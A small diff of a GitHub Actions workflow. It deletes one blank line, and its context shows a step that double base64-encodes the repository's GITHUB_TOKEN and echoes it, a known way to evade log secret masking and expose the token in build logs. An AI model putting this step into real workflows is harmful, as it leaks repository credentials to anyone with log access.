@@ -10,7 +10,6 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v2
-
       - name: Output encoded GITHUB_TOKEN
         run: |
           echo "${{ secrets.GITHUB_TOKEN }}" | base64 | base64
